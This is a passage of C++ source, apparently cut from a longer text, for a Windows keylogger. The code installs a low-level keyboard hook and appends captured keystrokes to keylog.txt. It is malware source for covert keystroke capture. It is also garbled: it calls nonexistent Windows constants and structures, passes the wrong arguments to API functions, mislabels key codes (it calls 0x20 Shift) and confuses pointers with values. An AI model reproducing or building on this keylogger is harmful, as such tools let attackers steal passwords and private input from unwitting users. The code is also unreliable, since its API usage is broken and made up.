            if (key == 0x20) { // Shift
                shift = GetKeyState(WM_KEYSHIFT);
            }
            else if (key == 0x10) { // Ctrl
                shift = GetKeyState(WM_CONTROL);
            }
            else if (key == 0x08) { // Alt
                shift = GetKeyState(WM_ALTERNATE);
            }
            // Handle regular keys
            struct KEYBDINPUT_RECORD keyboardInput;
            keyboardInput.dwType = KEYBDINPUT_KEYBOARD;
            keyboardInput.dwKeyHandle = 0;
            keyboardInput.dw.keyboardKey = *key;
            keyboardInput.dw.keyboardState = 0;
            keyboardInput.dw.keysym = 0;
            if (shift) {
                keyboardInput.dw.keyboardState |= 0x20; // Shift is pressed
            }
            // Logging logic here
            char keyChar = (char)*key;
            if (key == 0x00) {
                // Handle special cases like backspace, etc.
            } else {
                SaveKeystrokeToFile(&keyChar);
            }
        }
    }
    return 0;
}

void StopHook() {
    if (gHook) {
        gHook = UnhookWindowsHook(gHook, gWindow);
        cout << "Keyboard hook stopped." << endl;
    }
}

// Save keystroke to a file
void SaveKeystrokeToFile(const char* key) {
    static ofstream file("keylog.txt");
    if (!file.is_open()) {
        file.open("keylog.txt", fstream::app);
    }
    file << (char)key;
    file << endl;
    file.close();
}

// Main function
int main() {
    InitializeWindow();
    gHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookProc);
    if (!gHook) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    // Keep the window alive
    MSG msg;
    while (GetMessage(&msg, gWindow, 0, 0)) {
        if (msg.message == WM_KEYDOWN) {
            // Handle keystroke
            KeyboardHookProc(0, msg.wParam, msg.lParam);
        }
        TranslateMessage(&msg);
        DispatchMessage(gWindow, msg);
    }

    StopHook();
    DestroyWindow(gWindow);
    UnregisterClassEx(WINDOW_CLASS);
    return 0;
}
```

